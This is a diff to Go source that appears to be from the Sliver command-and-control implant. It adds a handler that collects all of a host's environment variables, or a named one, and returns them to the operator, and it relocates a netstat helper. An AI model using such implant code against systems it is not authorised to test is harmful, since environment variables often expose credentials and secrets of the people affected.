@@ -28,6 +28,7 @@ import (
 	"io/ioutil"
 	"net"
 	"os/exec"
+	"strings"
 
 	// {{if .Debug}}
 	"log"
@@ -626,37 +627,37 @@ func netstatHandler(data []byte, resp RPCResponse) {
 	}
 }
 
-func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
-	entries := make([]*sliverpb.SockTabEntry, 0)
-	for _, e := range s {
-		var (
-			pid  int32
-			exec string
-		)
-		if e.Process != nil {
-			pid = int32(e.Process.Pid)
-			exec = e.Process.Name
-		}
-		entries = append(entries, &sliverpb.SockTabEntry{
-			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
-				Ip:   e.LocalAddr.String(),
-				Port: uint32(e.LocalAddr.Port),
-			},
-			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
-				Ip:   e.RemoteAddr.String(),
-				Port: uint32(e.RemoteAddr.Port),
-			},
-			SkState: e.State.String(),
-			UID:     e.UID,
-			Process: &commonpb.Process{
-				Pid:        pid,
-				Executable: exec,
-			},
-			Protocol: proto,
-		})
+func getEnvHandler(data []byte, resp RPCResponse) {
+	envReq := &sliverpb.EnvReq{}
+	err := proto.Unmarshal(data, envReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
 	}
-	return entries
-
+	variables := os.Environ()
+	var envVars []*commonpb.EnvVar
+	envInfo := sliverpb.EnvInfo{}
+	if envReq.Name != "" {
+		envVars = make([]*commonpb.EnvVar, 1)
+		envVars[0] = &commonpb.EnvVar{
+			Key:   envReq.Name,
+			Value: os.Getenv(envReq.Name),
+		}
+	} else {
+		envVars = make([]*commonpb.EnvVar, len(variables))
+		for i, e := range variables {
+			pair := strings.SplitN(e, "=", 2)
+			envVars[i] = &commonpb.EnvVar{
+				Key:   pair[0],
+				Value: pair[1],
+			}
+		}
+	}
+	envInfo.Variables = envVars
+	data, err = proto.Marshal(&envInfo)
+	resp(data, err)
 }
 
 // ---------------- Data Encoders ----------------
@@ -724,4 +725,37 @@ func compressDir(path string, buf io.Writer) error {
 		return err
 	}
 	return nil
+}
+
+func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
+	entries := make([]*sliverpb.SockTabEntry, 0)
+	for _, e := range s {
+		var (
+			pid  int32
+			exec string
+		)
+		if e.Process != nil {
+			pid = int32(e.Process.Pid)
+			exec = e.Process.Name
+		}
+		entries = append(entries, &sliverpb.SockTabEntry{
+			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
+				Ip:   e.LocalAddr.String(),
+				Port: uint32(e.LocalAddr.Port),
+			},
+			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
+				Ip:   e.RemoteAddr.String(),
+				Port: uint32(e.RemoteAddr.Port),
+			},
+			SkState: e.State.String(),
+			UID:     e.UID,
+			Process: &commonpb.Process{
+				Pid:        pid,
+				Executable: exec,
+			},
+			Protocol: proto,
+		})
+	}
+	return entries
+
 }
